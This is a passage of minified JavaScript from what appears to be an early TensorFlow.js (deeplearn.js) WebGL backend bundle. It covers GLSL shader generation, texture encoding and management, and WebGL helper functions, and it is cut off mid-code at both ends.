halfCR) /\n                 vec2("+r[1]+".0, "+r[0]+".0);\n\n      return sample("+s+", uv);\n    }\n  "}(t,e,n));return r}(t,e,s)})).join("\n"),v=e.texShape,g=function(t,e){switch(t.length){case 0:return"\n    int getOutputCoords() {\n      return 0;\n    }\n  ";case 1:return function(t,e){if(1===e[0])return"\n      int getOutputCoords() {\n        return int(resultUV.x * "+e[1]+".0);\n      }\n    ";if(1===e[1])return"\n      int getOutputCoords() {\n        return int(resultUV.y * "+e[0]+".0);\n      }\n    ";return"\n    int getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2("+e[0]+", "+e[1]+"));\n      return resTexRC.x * "+e[1]+" + resTexRC.y;\n    }\n  "}(0,e);case 2:return function(t,e){if(i.arraysEqual(t,e))return"\n      ivec2 getOutputCoords() {\n        return ivec2(resultUV.yx * vec2("+e[0]+", "+e[1]+"));\n      }\n    ";if(1===t[1])return"\n      ivec2 getOutputCoords() {\n        ivec2 resTexRC = ivec2(resultUV.yx *\n                               vec2("+e[0]+", "+e[1]+"));\n        int index = resTexRC.x * "+e[1]+" + resTexRC.y;\n        return ivec2(index, 0);\n      }\n    ";if(1===t[0])return"\n      ivec2 getOutputCoords() {\n        ivec2 resTexRC = ivec2(resultUV.yx *\n                               vec2("+e[0]+", "+e[1]+"));\n        int index = resTexRC.x * "+e[1]+" + resTexRC.y;\n        return ivec2(0, index);\n      }\n    ";return"\n    ivec2 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2("+e[0]+", "+e[1]+"));\n      int index = resTexRC.x * "+e[1]+" + resTexRC.y;\n      int r = index / "+t[1]+";\n      int c = index - r * "+t[1]+";\n      return ivec2(r, c);\n    }\n  "}(t,e);case 3:return r=e,o=(n=t)[1]*n[2],s=n[2],"\n    ivec3 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2("+r[0]+", "+r[1]+"));\n      int index = resTexRC.x * "+r[1]+" + resTexRC.y;\n      int r = index / "+o+";\n      index -= r * "+o+";\n      int c = index / "+s+";\n      int d = index - c * "+s+";\n      return ivec3(r, c, d);\n    }\n  ";case 4:return function(t,e){var n=t[3],r=t[2]*n,i=t[1]*r;return"\n    ivec4 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n        vec2("+e[0]+", "+e[1]+"));\n      int index = resTexRC.x * "+e[1]+" + resTexRC.y;\n\n      int r = index / "+i+";\n      index -= r * "+i+";\n\n      int c = index / "+r+";\n      index -= c * "+r+";\n\n      int d = index / "+n+";\n      int d2 = index - d * "+n+";\n\n      return ivec4(r, c, d, d2);\n    }\n  "}(t,e);default:throw new Error(t.length+"-D output sampling is not yet supported")}var n,r,o,s}(e.logicalShape,v);return[p,d,f,y,g,m,n].join("\n")};var u="\n  uniform float NaN;\n\n  const vec4 floatDeltas = vec4(\n      1.0,\n      1.0 / 255.0,\n      1.0 / (255.0 * 255.0),\n      1.0 / (255.0 * 255.0 * 255.0)\n  );\n  const float minValue = "+s.FLOAT_MIN+".0;\n  const float maxValue = "+s.FLOAT_MAX+".0;\n  const float range = (maxValue - minValue) / 255.0;\n  const vec2 dotRange = vec2(1.0, range);\n\n  float sample(sampler2D texture, vec2 uv) {\n    vec4 sampleValue = texture2D(texture, uv);\n    if (all(equal(sampleValue, vec4("+s.BYTE_NAN_VALUE+")))) {\n      return NaN;\n    }\n\n    vec4 encValue = floor(sampleValue * 255.0 + 0.5);\n    float decodedValue = dot(encValue, floatDeltas);\n    return dot(vec2(minValue, decodedValue), dotRange);\n  }\n",c="\n  const vec4 floatPowers = vec4(\n    1.0,\n    255.0,\n    255.0 * 255.0,\n    255.0 * 255.0 * 255.0\n  );\n  const vec2 recipRange = vec2(1.0/range);\n  const vec2 recipRange255 = vec2(1.0/(maxValue - minValue));\n\n  void setOutput(float decodedValue) {\n    if (isNaN(decodedValue)) {\n      gl_FragColor = vec4("+s.BYTE_NAN_VALUE+");\n      return;\n    }\n\n    float a = dot(vec2(decodedValue, -minValue), recipRange);\n    float b = fract(a) * 255.0;\n    float c = fract(b) * 255.0;\n    float d = fract(c) * 255.0;\n    gl_FragColor = floor(vec4(a, b, c, d)) / 255.0;\n\n    // TODO(dsmilkov): Version above gets better accuracy but probably slower\n    // than the version below. Benchmark to determine if the accuracy is worth\n    // the cost.\n\n    // float normValue = dot(vec2(decodedValue, -minValue), recipRange255);\n    // vec4 f = normValue * floatPowers;\n    // gl_FragColor = floor(fract(f) * 255.0) / 255.0;\n  }\n",l="\n  float sample(sampler2D texture, vec2 uv) {\n    return texture2D(texture, uv).r;\n  }\n",h="\n  void setOutput(float val) {\n    gl_FragColor = vec4(val, 0, 0, 0);\n  }\n",p="\n  precision highp float;\n  precision highp int;\n  varying vec2 resultUV;\n  const vec2 halfCR = vec2(0.5, 0.5);\n\n  bool isNaN(float val) {\n    float v1 = val * val;\n    float v2 = val * val;\n    return v1 == v2 ? false : true;\n  }\n\n  bool hasNaN(vec4 values) {\n    vec4 v1 = values * values;\n    vec4 v2 = values * values;\n    return any(notEqual(v1, v2));\n  }\n\n  float getNaN(vec4 values) {\n    return dot(vec4(1), values);\n  }\n\n  int round(float value) {\n    return int(floor(value + 0.5));\n  }\n\n  int imod(int x, int y) {\n    return x - y * (x / y);\n  }\n\n  const vec2 randomConst = vec2(\n    23.14069263277926, // e^pi (Gelfond's constant)\n     2.665144142690225 // 2^sqrt(2) (GelfondSchneider constant)\n  );\n\n  float random(float seed) {\n      return fract(cos(dot(resultUV * seed, randomConst)) * 12345.6789);\n  }\n\n  \nvec2 UVfrom1D(int texNumR, int texNumC, int index) {\n  int texR = index / texNumC;\n  int texC = index - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\n\n  \nvec2 UVfrom2D(int texNumR, int texNumC, int numC, int row, int col) {\n  int index = row * numC + col;\n  int texR = index / texNumC;\n  int texC = index - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\n\n  \nvec2 UVfrom3D(int texNumR, int texNumC, int stride0,\n    int stride1, int row, int col, int depth) {\n  // Explicitly use integer operations as dot() only works on floats.\n  int index = row * stride0 + col * stride1 + depth;\n  int texR = index / texNumC;\n  int texC = index - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\n\n  \nvec2 UVfrom4D(int texNumR, int texNumC, int stride0,\n    int stride1, int stride2, int row, int col, int depth,\n    int depth2) {\n  // Explicitly use integer operations as dot() only works on floats.\n  int index = row * stride0 + col * stride1 + depth * stride2 + depth2;\n  int texR = index / texNumC;\n  int texC = index - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\n\n";function d(t,e){var n=JSON.parse(JSON.stringify(t));return n.shapeInfo.logicalShape=e,n}function f(t,e){return e.map((function(e){return t[e]})).join(", ")}n.getCoordsDataType=function(t){if(t<=1)return"int";if(2===t)return"ivec2";if(3===t)return"ivec3";if(4===t)return"ivec4";throw Error("GPU for rank "+t+" is not yet supported")}},{"../../environment":27,"../../ops/broadcast_util":101,"../../util":143,"./tex_util":90}],89:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./shader_compiler"),i=function(){function t(t){this.variableNames=["source"],this.outputShape=t,this.rank=t.length;var e=r.getCoordsDataType(this.rank),n=function(t){if(1===t)return"sourceLoc";if(2===t)return"sourceLoc.x, sourceLoc.y";if(3===t)return"sourceLoc.x, sourceLoc.y, sourceLoc.z";if(4===t)return"sourceLoc.x, sourceLoc.y, sourceLoc.z, sourceLoc.w";throw Error("Slicing for rank "+t+" is not yet supported")}(this.rank);this.userCode="\n      uniform "+e+" start;\n\n      void main() {\n        "+e+" sourceLoc = start + getOutputCoords();\n        setOutput(getSource("+n+"));\n      }\n    "}return t.prototype.getCustomSetupFunc=function(t){var e=this;if(t.length!==this.rank)throw Error("The rank ("+this.rank+") of the program must match the length of start ("+t.length+")");return function(n,r){if(null!=e.startLoc||(e.startLoc=n.getUniformLocationNoThrow(r,"start"),null!=e.startLoc))if(1===e.rank)n.gl.uniform1i(e.startLoc,t[0]);else if(2===e.rank)n.gl.uniform2i(e.startLoc,t[0],t[1]);else if(3===e.rank)n.gl.uniform3i(e.startLoc,t[0],t[1],t[2]);else{if(4!==e.rank)throw Error("Slicing for rank "+e.rank+" is not yet supported");n.gl.uniform4i(e.startLoc,t[0],t[1],t[2],t[3])}}},t}();n.SliceProgram=i},{"./shader_compiler":88}],90:[function(t,e,n){"use strict";function r(t,e){return t*e}function i(t,e){if(t%e!=0)throw new Error("unpackedSize ("+t+") must be a multiple of "+e);return t/e}Object.defineProperty(n,"__esModule",{value:!0}),function(t){t[t.FLOAT=0]="FLOAT",t[t.UNSIGNED_BYTE=1]="UNSIGNED_BYTE"}(n.TextureType||(n.TextureType={})),n.getUnpackedMatrixTextureShapeWidthHeight=function(t,e){return[e,t]},n.getUnpackedArraySizeFromMatrixSize=r,n.getColorMatrixTextureShapeWidthHeight=function(t,e){return[4*e,t]},n.getMatrixSizeFromUnpackedArraySize=i,n.encodeMatrixToUnpackedArray=function(t,e,n){var i=r(t.length,n);if(e.length<i)throw new Error("unpackedArray length ("+e.length+") must be >= "+i);for(var o=0,s=0;s<t.length;++s)e[o]=t[s],o+=n},n.FLOAT_MAX=2e4,n.FLOAT_MIN=-n.FLOAT_MAX;var o=(n.FLOAT_MAX-n.FLOAT_MIN)/255,s=[1,1/255,1/65025,1/16581375],a=[1,255,65025];function u(t,e){return[Math.ceil(e/2),Math.ceil(t/2)]}function c(t,e){var n=u(t,e);return n[0]*n[1]*4}n.BYTE_NAN_VALUE=0,n.encodeFloatArray=function(t){for(var e=new Uint8Array(4*t.length),r=function(r){var i=t[r/4];if(isNaN(i))return e[r]=n.BYTE_NAN_VALUE,e[r+1]=n.BYTE_NAN_VALUE,e[r+2]=n.BYTE_NAN_VALUE,e[r+3]=n.BYTE_NAN_VALUE,"continue";var s=(i-n.FLOAT_MIN)/o,u=a.map((function(t){return t*s})).map((function(t){return Math.floor(t%1*255)}));e[r]=Math.floor(s),e[r+1]=u[0],e[r+2]=u[1],e[r+3]=u[2]},i=0;i<e.length;i+=4)r(i);return e},n.decodeToFloatArray=function(t){for(var e=new Float32Array(t.length/4),r=function(r){if(t[r]===n.BYTE_NAN_VALUE&&t[r+1]===n.BYTE_NAN_VALUE&&t[r+2]===n.BYTE_NAN_VALUE&&t[r+3]===n.BYTE_NAN_VALUE)return e[r/4]=NaN,"continue";var i=0;s.forEach((function(e,n){i+=e*t[r+n]}));var a=i*o+n.FLOAT_MIN;e[r/4]=a},i=0;i<t.length;i+=4)r(i);return e},n.decodeMatrixFromUnpackedArray=function(t,e,n){var r=i(t.length,n);if(e.length<r)throw new Error("matrix length ("+e.length+") must be >= "+r);for(var o=0,s=0;s<t.length;s+=n)e[o++]=t[s]},n.decodeMatrixFromUnpackedColorRGBAArray=function(t,e,n){var r=t.length*n/4;if(e.length<r)throw new Error("matrix length ("+e.length+") must be >= "+r);for(var i=0,o=0;o<t.length;o+=4)for(var s=0;s<n;s++)e[i++]=t[o+s]},n.getPackedMatrixTextureShapeWidthHeight=u,n.getPackedRGBAArraySizeFromMatrixShape=c,n.encodeMatrixToPackedRGBA=function(t,e,n,r){var i=c(e,n);if(r.length<i)throw new Error("packedRGBA length ("+r.length+") must be >= "+i);for(var o=u(e,n),s=o[0],a=o[1],l=n%2==1,h=e%2==1,p=Math.floor(n/2),d=Math.floor(e/2),f=l?4:0,y=n,m=0,v=0;v<d;++v){for(var g=2*v*n,_=0;_<p;++_){var b=g+2*_;r[m]=t[b],r[m+1]=t[b+1],r[m+2]=t[b+y],r[m+3]=t[b+y+1],m+=4}m+=f}if(l){b=n-1,m=4*(s-1);var w=2*n;for(f=4*s,v=0;v<d;++v)r[m]=t[b],r[m+2]=t[b+n],b+=w,m+=f}if(h)for(b=(e-1)*n,m=(a-1)*s*4,_=0;_<p;++_)r[m++]=t[b++],r[m++]=t[b++],m+=2;return l&&h&&(r[r.length-4]=t[t.length-1]),r},n.decodeMatrixFromPackedRGBA=function(t,e,n,r){var i=e*n;if(i<r.length)throw new Error("matrix length ("+r.length+") must be >= "+i);for(var o=n%2==1,s=e%2==1,a=Math.floor(n/2),c=Math.floor(e/2),l=u(e,n),h=l[0],p=l[1],d=o?4:0,f=n+(o?1:0),y=0,m=0,v=n,g=0;g<c;++g){for(var _=0;_<a;++_)r[m++]=t[y++],r[m++]=t[y++],r[v++]=t[y++],r[v++]=t[y++];y+=d,m+=f,v+=f}if(o){y=4*(h-1);var b=n-1;for(d=4*h,f=2*n,g=0;g<c;++g)r[b]=t[y],r[b+n]=t[y+2],y+=d,b+=f}if(s)for(y=(p-1)*h*4,b=(e-1)*n,_=0;_<a;++_)r[b++]=t[y++],r[b++]=t[y++],y+=2;return o&&s&&(r[r.length-1]=t[t.length-4]),r}},{}],91:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./tex_util"),i=function(){function t(t){this.gpgpu=t,this.numUsedTextures=0,this.numFreeTextures=0,this.freeTextures={},this.logEnabled=!1,this.allocatedTextures=[],this.usedTextureCount={}}return t.prototype.acquireTexture=function(t,e){void 0===e&&(e=r.TextureType.FLOAT);var n=o(t,e);if(n in this.freeTextures||(this.freeTextures[n]=[]),n in this.usedTextureCount||(this.usedTextureCount[n]=0),this.usedTextureCount[n]++,this.freeTextures[n].length>0)return this.numFreeTextures--,this.numUsedTextures++,this.log(),this.freeTextures[n].shift();this.numUsedTextures++,this.log();var i=this.gpgpu.createMatrixTexture(t[0],t[1]);return this.allocatedTextures.push(i),i},t.prototype.releaseTexture=function(t,e,n){void 0===n&&(n=r.TextureType.FLOAT);var i=o(e,n);i in this.freeTextures||(this.freeTextures[i]=[]),this.freeTextures[i].push(t),this.numFreeTextures++,this.numUsedTextures--,this.usedTextureCount[i]--,this.log()},t.prototype.log=function(){if(this.logEnabled){var t=this.numFreeTextures+this.numUsedTextures;console.log("Free/Used",this.numFreeTextures+" / "+this.numUsedTextures,"("+t+")")}},t.prototype.getNumUsedTextures=function(){return this.numUsedTextures},t.prototype.getNumFreeTextures=function(){return this.numFreeTextures},t.prototype.dispose=function(){var t=this;null!=this.allocatedTextures&&(this.allocatedTextures.forEach((function(e){t.gpgpu.deleteMatrixTexture(e)})),this.freeTextures=null,this.allocatedTextures=null,this.usedTextureCount=null,this.numUsedTextures=0,this.numFreeTextures=0)},t}();function o(t,e){return t[0]+"_"+t[1]+"_"+e}n.TextureManager=i},{"./tex_util":90}],92:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./shader_compiler"),i=function(t,e){this.variableNames=["A"];for(var n=new Array(t.length),i=0;i<n.length;i++)n[i]=t[i]*e[i];this.outputShape=n,this.rank=n.length;var o=r.getCoordsDataType(this.rank),s=function(t){var e=t.length;if(e>4)throw Error("Tile for rank "+e+" is not yet supported");if(1===e)return"imod(resRC, "+t[0]+")";for(var n=["resRC.x","resRC.y","resRC.z","resRC.w"],r=[],i=0;i<t.length;i++)r.push("imod("+n[i]+", "+t[i]+")");return r.join()}(t);this.userCode="\n      void main() {\n        "+o+" resRC = getOutputCoords();\n        setOutput(getA("+s+"));\n      }\n    "};n.TileProgram=i},{"./shader_compiler":88}],93:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./shader_compiler"),i=function(t,e){this.variableNames=["A"];for(var n=new Array(t.length),i=0;i<n.length;i++)n[i]=t[e[i]];this.outputShape=n,this.rank=n.length;var o=r.getCoordsDataType(this.rank),s=function(t){var e=t.length;if(e>4)throw Error("Transpose for rank "+e+" is not yet supported");for(var n=["resRC.x","resRC.y","resRC.z","resRC.w"],r=new Array(e),i=0;i<t.length;i++)r[t[i]]=n[i];return r.join()}(e);this.userCode="\n    void main() {\n      "+o+" resRC = getOutputCoords();\n      setOutput(getA("+s+"));\n    }\n    "};n.TransposeProgram=i},{"./shader_compiler":88}],94:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../../ops/selu_util"),i=function(t,e){this.variableNames=["A"],this.outputShape=t,this.userCode="\n      float unaryOperation(float x) {\n        "+e+"\n      }\n\n      void main() {\n        float x = getAAtOutCoords();\n        float y = unaryOperation(x);\n\n        setOutput(y);\n      }\n    "};n.UnaryOpProgram=i;var o="\n  if (isNaN(x)) return x;\n";n.ABS="\n  return abs(x);\n",n.RELU=o+"\n  return (x < 0.0) ? 0.0 : x;\n",n.ELU="\n  return (x >= 0.0) ? x : (exp(x) - 1.0);\n",n.ELU_DER="\n  return (x >= 0.0) ? 1.0 : exp(x);\n",n.SELU="\n  // Stable and Attracting Fixed Point (0, 1) for Normalized Weights.\n  // see: https://arxiv.org/abs/1706.02515\n  float scaleAlpha = "+r.SELU_SCALEALPHA+";\n  float scale = "+r.SELU_SCALE+";\n  return (x >= 0.0) ? scale * x : scaleAlpha * (exp(x) - 1.0);\n",n.LEAKY_RELU=function(t){return"\n    return (x >= 0.0) ? x : "+t+" * x;\n  "},n.STEP=function(t){return void 0===t&&(t=0),o+"\n    return x > 0.0 ? 1.0 : float("+t+");\n  "},n.NEG="\n  return -x;\n",n.CEIL="\n  return ceil(x);\n",n.FLOOR="\n  return floor(x);\n",n.EXP="\n  return exp(x);\n",n.LOG="\n  return log(x);\n",n.SQRT=o+"\n  return sqrt(x);\n",n.SIGMOID="\n  return 1.0 / (1.0 + exp(-1.0 * x));\n",n.SIN=o+"\n  return sin(x);\n",n.COS=o+"\n  return cos(x);\n",n.TAN="\n  return tan(x);\n",n.ASIN=o+"\n  return asin(x);\n",n.ACOS=o+"\n  return acos(x);\n",n.ATAN=o+"\n  return atan(x);\n",n.SINH="\n  float e2x = exp(x);\n  return (e2x - 1.0 / e2x) / 2.0;\n",n.COSH="\n  float e2x = exp(-x);\n  return (e2x + 1.0 / e2x) / 2.0;\n",n.TANH="\n  float e2x = exp(-2.0 * abs(x));\n  return sign(x) * (1.0 - e2x) / (1.0 + e2x);\n",n.SQUARE="\n  return x * x;\n",n.LOGICAL_NOT=o+"\n  return float(!(x >= 1.0));\n",n.TO_INT="\n  return float(int(x));\n"},{"../../ops/selu_util":120}],95:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=null,i=t("../../util"),o=t("../../environment");function s(t,e){var n,r=o.ENV.get("WEBGL_VERSION");if(2===r?n=t.getContext("webgl2",e):1===r&&(n=t.getContext("webgl",e)||t.getContext("experimental-webgl",e)),0===r||null==n)throw new Error("This browser does not support WebGL.");return n}function a(t,e){var n=e();return c(t),n}n.createWebGLRenderingContext=function(t){var e=document.createElement("canvas");return e.width=1,e.height=1,s(e,t)},n.createWebGLRenderingContextFromCanvas=s,n.callAndCheck=a;var u=!1;function c(t){if(u){var e=t.getError();if(e!==t.NO_ERROR)throw new Error("WebGL Error: "+l(t,e))}}function l(t,e){switch(e){case t.NO_ERROR:return"NO_ERROR";case t.INVALID_ENUM:return"INVALID_ENUM";case t.INVALID_VALUE:return"INVALID_VALUE";case t.INVALID_OPERATION:return"INVALID_OPERATION";case t.INVALID_FRAMEBUFFER_OPERATION:return"INVALID_FRAMEBUFFER_OPERATION";case t.OUT_OF_MEMORY:return"OUT_OF_MEMORY";case t.CONTEXT_LOST_WEBGL:return"CONTEXT_LOST_WEBGL";default:return"Unknown error code "+e}}n.enableDebugWebGLErrorChecking=function(t){u=t},n.checkWebGLError=c,n.getWebGLErrorMessage=l,n.getExtensionOrThrow=function(t,e){return y(t,(function(){return t.getExtension(e)}),'Extension "'+e+'" not supported on this browser.')},n.createVertexShader=function(t,e){var n=y(t,(function(){return t.createShader(t.VERTEX_SHADER)}),"Unable to create vertex WebGLShader.");if(a(t,(function(){return t.shaderSource(n,e)})),a(t,(function(){return t.compileShader(n)})),!1===t.getShaderParameter(n,t.COMPILE_STATUS))throw console.log(t.getShaderInfoLog(n)),new Error("Failed to compile vertex shader.");return n},n.createFragmentShader=function(t,e){var n=y(t,(function(){return t.createShader(t.FRAGMENT_SHADER)}),"Unable to create fragment WebGLShader.");if(a(t,(function(){return t.shaderSource(n,e)})),a(t,(function(){return t.compileShader(n)})),!1===t.getShaderParameter(n,t.COMPILE_STATUS))throw function(t,e){var n=h.exec(e);if(null==n)return console.log("Couldn't parse line number in error: "+e),void console.log(t);for(var r=+n[1],o=t.split("\n"),s=o.length.toString().length+2,a=o.map((function(t,e){return i.rightPad((e+1).toString(),s)+t})),u=0,c=0;c<a.length;c++)u=Math.max(a[c].length,u);var l=a.slice(0,r-1),p=a.slice(r-1,r),d=a.slice(r);console.log(l.join("\n")),console.log(e.split("\n")[0]),console.log("%c "+i.rightPad(p[0],u),"border:1px solid red; background-color:#e3d2d2; color:#a61717"),console.log(d.join("\n"))}(e,t.getShaderInfoLog(n)),new Error("Failed to compile fragment shader.");return n};var h=/ERROR: [0-9]+:([0-9]+):/g;function p(t){return null!=r?r:r=a(t,(function(){return t.getParameter(t.MAX_TEXTURE_SIZE)}))}function d(t,e,n){m(t,n),a(t,(function(){return t.activeTexture(t.TEXTURE0+n)})),a(t,(function(){return t.bindTexture(t.TEXTURE_2D,e)}))}function f(t,e){switch(e){case t.FRAMEBUFFER_INCOMPLETE_ATTACHMENT:return"FRAMEBUFFER_INCOMPLETE_ATTACHMENT";case t.FRAMEBUFFER_INCOMPLETE_MISSING_ATTACHMENT:return"FRAMEBUFFER_INCOMPLETE_MISSING_ATTACHMENT";case t.FRAMEBUFFER_INCOMPLETE_DIMENSIONS:return"FRAMEBUFFER_INCOMPLETE_DIMENSIONS";case t.FRAMEBUFFER_UNSUPPORTED:return"FRAMEBUFFER_UNSUPPORTED";default:return"unknown error "+e}}function y(t,e,n){var r=a(t,(function(){return e()}));if(null==r)throw new Error(n);return r}function m(t,e){var n=t.MAX_COMBINED_TEXTURE_IMAGE_UNITS-1,r=e+t.TEXTURE0;if(r<t.TEXTURE0||r>n)throw new Error("textureUnit must be in "+("[gl.TEXTURE0, gl.TEXTURE"+n+"]")+".")}n.createProgram=function(t){return y(t,(function(){return t.createProgram()}),"Unable to create WebGLProgram.")},n.linkProgram=function(t,e){if(a(t,(function(){return t.linkProgram(e)})),!1===t.getProgramParameter(e,t.LINK_STATUS))throw console.log(t.getProgramInfoLog(e)),new Error("Failed to link vertex and fragment shaders.")},n.validateProgram=function(t,e){if(a(t,(function(){return t.validateProgram(e)})),!1===t.getProgramParameter(e,t.VALIDATE_STATUS))throw console.log(t.getProgramInfoLog(e)),new Error("Shader program validation failed.")},n.createStaticVertexBuffer=function(t,e){var n=y(t,(function(){return t.createBuffer()}),"Unable to create WebGLBuffer");return a(t,(function(){return t.bindBuffer(t.ARRAY_BUFFER,n)})),a(t,(function(){return t.bufferData(t.ARRAY_BUFFER,e,t.STATIC_DRAW)})),n},n.createStaticIndexBuffer=function(t,e){var n=y(t,(function(){return t.createBuffer()}),"Unable to create WebGLBuffer");return a(t,(function(){return t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,n)})),a(t,(function(){return t.bufferData(t.ELEMENT_ARRAY_BUFFER,e,t.STATIC_DRAW)})),n},n.queryMaxTextureSize=p,n.getChannelsPerTexture=function(){return o.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")&&2===o.ENV.get("WEBGL_VERSION")?1:4},n.createTexture=function(t){return y(t,(function(){return t.createTexture()}),"Unable to create WebGLTexture.")},n.validateTextureSize=function(t,e,n){var r=p(t);if(e<=0||n<=0){var i="["+e+"x"+n+"]";throw new Error("Requested texture size "+i+" is invalid.")}if(e>r||n>r){i="["+e+"x"+n+"]";throw new Error("Requested texture size "+i+" greater than WebGL maximum on this browser / GPU "+("["+r+"x"+r+"]")+".")}},n.createFramebuffer=function(t){return y(t,(function(){return t.createFramebuffer()}),"Unable to create WebGLFramebuffer.")},n.bindVertexBufferToProgramAttribute=function(t,e,n,r,i,o,s){var u=t.getAttribLocation(e,n);-1!==u&&(a(t,(function(){return t.bindBuffer(t.ARRAY_BUFFER,r)})),a(t,(function(){return t.vertexAttribPointer(u,i,t.FLOAT,!1,o,s)})),a(t,(function(){return t.enableVertexAttribArray(u)})))},n.bindTextureUnit=d,n.unbindTextureUnit=function(t,e){m(t,e),a(t,(function(){return t.activeTexture(t.TEXTURE0+e)})),a(t,(function(){return t.bindTexture(t.TEXTURE_2D,null)}))},n.getProgramUniformLocationOrThrow=function(t,e,n){return y(t,(function(){return t.getUniformLocation(e,n)}),'uniform "'+n+'" not present in program.')},n.getProgramUniformLocation=function(t,e,n){return t.getUniformLocation(e,n)},n.bindTextureToProgramUniformSampler=function(t,e,n,r,i){a(t,(function(){return d(t,n,i)})),a(t,(function(){return t.uniform1i(r,i)}))},n.bindCanvasToFramebuffer=function(t){a(t,(function(){return t.bindFramebuffer(t.FRAMEBUFFER,null)})),a(t,(function(){return t.viewport(0,0,t.canvas.width,t.canvas.height)})),a(t,(function(){return t.scissor(0,0,t.canvas.width,t.canvas.height)}))},n.bindColorTextureToFramebuffer=function(t,e,n){a(t,(function(){return t.bindFramebuffer(t.FRAMEBUFFER,n)})),a(t,(function(){return t.framebufferTexture2D(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,e,0)}))},n.unbindColorTextureFromFramebuffer=function(t,e){a(t,(function(){return t.bindFramebuffer(t.FRAMEBUFFER,e)})),a(t,(function(){return t.framebufferTexture2D(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,null,0)}))},n.validateFramebuffer=function(t){var e=t.checkFramebufferStatus(t.FRAMEBUFFER);if(e!==t.FRAMEBUFFER_COMPLETE)throw new Error("Error binding framebuffer: "+f(t,e))},n.getFramebufferErrorMessage=f,n.getTextureShapeFromLogicalShape=function(t,e){2!==e.length&&(e=i.squeezeShape(e).newShape);var n=p(t),r=i.sizeFromShape(e);return e.length<=1&&r<=n?[r,1]:2===e.length&&e[0]<=n&&e[1]<=n?e:3===e.length&&e[0]<=n&&e[1]*e[2]<=n?[e[0],e[1]*e[2]]:4===e.length&&e[0]<=n&&e[1]*e[2]*e[3]<=n?[e[0],e[1]*e[2]*e[3]]:i.sizeToSquarishShape(r)}},{"../../environment":27,"../../util":143}],96:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./environment"),i=t("./ops/array_ops"),o=t("./ops/batchnorm"),s=t("./ops/binary_ops"),a=t("./ops/compare"),u=t("./ops/conv"),c=t("./ops/image_ops"),l=t("./ops/logical_ops"),h=t("./ops/lrn"),p=t("./ops/lstm"),d=t("./ops/matmul"),f=t("./ops/norm"),y=t("./ops/ops"),m=t("./ops/pool"),v=t("./ops/reduction_ops"),g=t("./ops/reverse"),_=t("./ops/slice"),b=t("./ops/softmax"),w=t("./ops/transpose"),x=t("./ops/unary_ops"),T=t("./tracking"),S=t("./util"),O=T.Tracking.tidy,E=T.Tracking.keep,A=function(){function t(t,e){this.matMul=d.MatmulOps.matMul,this.vectorTimesMatrix=d.MatmulOps.vectorTimesMatrix,this.outerProduct=d.MatmulOps.outerProduct,this.matrixTimesVector=d.MatmulOps.matrixTimesVector,this.dotProduct=d.MatmulOps.dotProduct,this.slice=_.SliceOps.slice,this.slice1D=_.SliceOps.slice1d,this.slice2D=_.SliceOps.slice2d,this.slice3D=_.SliceOps.slice3d,this.slice4D=_.SliceOps.slice4d,this.reverse=g.ReverseOps.reverse,this.reverse1D=g.ReverseOps.reverse1d,this.reverse2D=g.ReverseOps.reverse2d,this.reverse3D=g.ReverseOps.reverse3d,this.reverse4D=g.ReverseOps.reverse4d,this.batchNormalization=o.BatchNormOps.batchNormalization,this.batchNormalization2D=o.BatchNormOps.batchNormalization2d,this.batchNormalization3D=o.BatchNormOps.batchNormalization3d,this.batchNormalization4D=o.BatchNormOps.batchNormalization4d,this.avgPool=m.PoolOps.avgPool,this.maxPool=m.PoolOps.maxPool,this.minPool=m.PoolOps.minPool,this.maxPoolBackprop=m.PoolOps.maxPoolBackprop,this.conv2dTranspose=u.ConvOps.conv2dTranspose,this.depthwiseConv2D=u.ConvOps.depthwiseConv2d,this.conv2dDerFilter=u.ConvOps.conv2dDerFilter,this.conv2dDerInput=u.ConvOps.conv2dDerInput,this.argMax=v.ReductionOps.argMax,this.argMin=v.ReductionOps.argMin,this.logSumExp=v.ReductionOps.logSumExp,this.max=v.ReductionOps.max,this.mean=v.ReductionOps.mean,this.min=v.ReductionOps.min,this.moments=v.ReductionOps.moments,this.sum=v.ReductionOps.sum,this.add=s.BinaryOps.add,this.addStrict=s.BinaryOps.addStrict,this.div=s.BinaryOps.div,this.divide=this.div,this.divStrict=s.BinaryOps.divStrict,this.divideStrict=this.divStrict,this.maximum=s.BinaryOps.maximum,this.maximumStrict=s.BinaryOps.maximumStrict,this.minimum=s.BinaryOps.minimum,this.minimumStrict=s.BinaryOps.minimumStrict,this.mul=s.BinaryOps.mul,this.multiply=this.mul,this.mulStrict=s.BinaryOps.mulStrict,this.multiplyStrict=this.mulStrict,this.pow=s.BinaryOps.pow,this.powStrict=s.BinaryOps.powStrict,this.sub=s.BinaryOps.sub,this.subtract=this.sub,this.subStrict=s.BinaryOps.subStrict,this.logicalNot=l.LogicalOps.logicalNot,this.logicalAnd=l.LogicalOps.logicalAnd,this.logicalOr=l.LogicalOps.logicalOr,this.logicalXor=l.LogicalOps.logicalXor,this.where=l.LogicalOps.where,this.transpose=w.TransposeOps.transpose,this.equal=a.CompareOps.equal,this.equalStrict=a.CompareOps.equalStrict,this.greater=a.CompareOps.greater,this.greaterStrict=a.CompareOps.greaterStrict,this.greaterEqual=a.Co